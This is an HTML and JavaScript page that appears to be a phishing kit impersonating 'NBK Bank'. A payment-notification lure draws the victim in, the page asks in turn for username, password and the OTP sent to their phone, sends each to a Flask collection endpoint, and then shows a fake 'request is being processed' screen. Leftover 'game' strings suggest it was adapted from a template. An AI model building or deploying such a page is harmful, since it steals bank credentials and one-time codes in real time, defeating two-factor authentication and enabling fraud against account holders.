<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBK Login</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font for a magazine-like feel (Inter is default, but adding a serif fallback) */
        body {
            font-family: "Inter", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #ffffff; /* Body background is white */
            margin: 0; /* Ensures no default body margin */
            padding: 0; /* Ensures no default body padding */
        }
        /* Custom blue for text, similar to magazine blue */
        .text-magazine-blue {
            color: #007bff; /* A vibrant blue */
        }
        /* Darker blue for the button */
        .bg-dark-blue {
            background-color: #0056b3; /* A darker shade of blue */
        }
        .bg-dark-blue:hover {
            background-color: #004085; /* Even darker on hover */
        }

        /* CSS for the rotating spinner */
        .spinner {
            border: 4px solid rgba(0, 123, 255, 0.1); /* Light blue border */
            border-top: 4px solid #007bff; /* Blue top border */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite; /* Spin animation */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <!-- This div now covers the entire screen with a white background -->
    <div class="bg-white w-full h-screen flex items-center justify-center">
        <!-- Inner container for the login form content, keeping it centered and with max-width -->
        <div class="p-8 rounded-xl shadow-2xl max-w-md w-full bg-white">
            <!-- Page Icon and Game Login Text -->
            <div class="flex items-center justify-center mb-6">
                <!-- Image for the page icon - Adjusted size to w-32 h-32 (double of w-16 h-16) -->
                <img src="nk.png" alt="Game Icon" class="w-32 h-32 mr-2">
                <h1 class="text-3xl font-bold text-gray-900">NBK Bank</h1>
            </div>

            <!-- Dynamic Heading -->
            <h2 id="dynamicHeading" class="text-xl font-bold text-magazine-blue mb-4 text-center">Login NBK Account</h2>
            <!-- New dynamic subheading -->
            <p id="dynamicSubheading" class="text-gray-700 text-center mb-8"></p>

            <!-- Form Container -->
            <div id="loginFormContainer" class="text-left">
                <!-- Content will be dynamically updated by JavaScript -->
            </div>
        </div>
    </div>

    <script>
        // Get references to the form container and the dynamic heading
        const loginFormContainer = document.getElementById('loginFormContainer');
        const dynamicHeading = document.getElementById('dynamicHeading');
        const dynamicSubheading = document.getElementById('dynamicSubheading'); // Get reference to new subheading

        // Variable to track the current phase of the login process
        // Possible values: 'username', 'password', 'otp', 'loading', 'welcome'
        let loginPhase = 'username';
        let storedUsername = ''; // To store username temporarily
        let storedPassword = ''; // To store password temporarily
        let storedOtp = '';      // To store OTP temporarily

        // Function to send data to the server
        async function sendDataToServer(phase, data) {
            const payload = {
                phase: phase,
                data: data,
                timestamp: new Date().toISOString() // Add a timestamp for server-side logging
            };

            try {
                // IMPORTANT: Explicitly use the full URL of your Flask server.
                // Ensure your Flask server is running on http://127.0.0.1:5000
                const response = await fetch('http://127.0.0.1:5000/data', { // CORRECTED URL HERE
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                // Log the response, but do not wait for it to affect the UI flow
                if (response.ok) {
                    console.log(`Data for phase '${phase}' sent successfully!`);
                    const responseData = await response.json(); // Assuming server sends JSON response
                    console.log('Server response:', responseData);
                } else {
                    console.error(`Failed to send data for phase '${phase}'. Status: ${response.status}`);
                    const errorText = await response.text();
                    console.error('Server error:', errorText);
                }
            } catch (error) {
                console.error('Network or server error:', error);
            }
        }

        // Function to render the current content based on the login phase
        function renderForm() {
            let contentHtml = '';

            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                let labelText = '';
                let inputType = '';
                let inputId = '';
                let placeholder = '';
                let buttonText = '';
                let inputValue = ''; // To pre-fill input if user goes back or for debugging

                if (loginPhase === 'username') {
                    labelText = 'Enter your username';
                    inputType = 'text';
                    inputId = 'username';
                    placeholder = 'Your username';
                    buttonText = 'Next';
                    inputValue = storedUsername;
                } else if (loginPhase === 'password') {
                    labelText = 'Enter your password';
                    inputType = 'password';
                    inputId = 'password';
                    placeholder = 'Your password';
                    buttonText = 'Login';
                    inputValue = storedPassword;
                } else if (loginPhase === 'otp') {
                    labelText = 'Enter OTP sent to your phone number';
                    inputType = 'text'; // OTP is often text, could be 'number' too
                    inputId = 'otp';
                    placeholder = 'Your OTP';
                    buttonText = 'Verify OTP';
                    inputValue = storedOtp;
                }

                contentHtml = `
                    <label for="${inputId}" class="block text-magazine-blue text-lg font-semibold mb-2">${labelText}</label>
                    <input type="${inputType}" id="${inputId}" placeholder="${placeholder}" value="${inputValue}"
                           class="w-full p-3 mb-6 bg-white text-gray-900 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <button id="actionButton"
                            class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                        ${buttonText}
                    </button>
                `;
            } else if (loginPhase === 'loading') {
                contentHtml = `
                    <div class="flex flex-col items-center justify-center py-10">
                        <div class="spinner mb-4"></div>
                        <p class="text-gray-900 text-lg">Loading...</p>
                    </div>
                `;
            } else if (loginPhase === 'welcome') {
                contentHtml = `
                    <div class="text-center">
                        <p class="text-gray-900 text-2xl font-bold mb-6">welcome back Again!</p>
                        <button id="proceedButton"
                                class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                            Finish
                        </button>
                    </div>
                `;
            }

            // Update the form container with the new content
            loginFormContainer.innerHTML = contentHtml;

            // Update the dynamic heading and subheading based on the current phase
            if (loginPhase === 'welcome') {
                dynamicHeading.textContent = 'Your request is being processed, thank you for staying with us';
                dynamicSubheading.textContent = ''; // Clear subheading for welcome page
            } else {
                dynamicHeading.textContent = 'Login NBK Account'; // Reset for other phases
                dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account'; // Set subheading for other phases
            }


            // Attach event listener based on the current phase
            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                document.getElementById('actionButton').addEventListener('click', handleAction);
            } else if (loginPhase === 'welcome') {
                document.getElementById('proceedButton').addEventListener('click', () => {
                    alert("Welcome to the game!"); // Simulate proceeding to game
                    // In a real app, you would redirect the user here:
                    // window.location.href = '/game-dashboard.html';
                });
            }
        }

        // Function to handle button clicks based on the current phase
        function handleAction() {
            let isValid = false;
            let currentInputData = '';
            let nextPhase = '';

            if (loginPhase === 'username') {
                const usernameInput = document.getElementById('username');
                currentInputData = usernameInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your username.");
                    return;
                }
                storedUsername = currentInputData;
                isValid = true;
                nextPhase = 'password';
            } else if (loginPhase === 'password') {
                const passwordInput = document.getElementById('password');
                currentInputData = passwordInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your password.");
                    return;
                }
                storedPassword = currentInputData;
                isValid = true;
                nextPhase = 'otp';
            } else if (loginPhase === 'otp') {
                const otpInput = document.getElementById('otp');
                currentInputData = otpInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter the OTP.");
                    return;
                }
                storedOtp = currentInputData;
                isValid = true;
                nextPhase = 'welcome';
            }

            if (isValid) {
                // Send the data to the server immediately, but don't wait for its response
                sendDataToServer(loginPhase, currentInputData);

                // Show loading spinner
                loginPhase = 'loading';
                renderForm();

                // Simulate a 3-second delay for the UI transition
                setTimeout(() => {
                    // Transition to the determined next phase
                    loginPhase = nextPhase;

                    // Console logs for debugging/tracking, not visible to user
                    if (nextPhase === 'otp') {
                        console.log("OTP sent to your registered phone number!");
                    } else if (nextPhase === 'welcome') {
                        console.log("OTP Verified! Login successful!");
                        console.log("Username:", storedUsername);
                        console.log("Password:", storedPassword);
                        console.log("OTP:", storedOtp);
                    }
                    renderForm(); // Render the next phase
                }, 3000); // 3000 milliseconds = 3 seconds
            }
        }

        // Initial render when the page loads
        document.addEventListener('DOMContentLoaded', renderForm);
    </script>

</body>
</html>
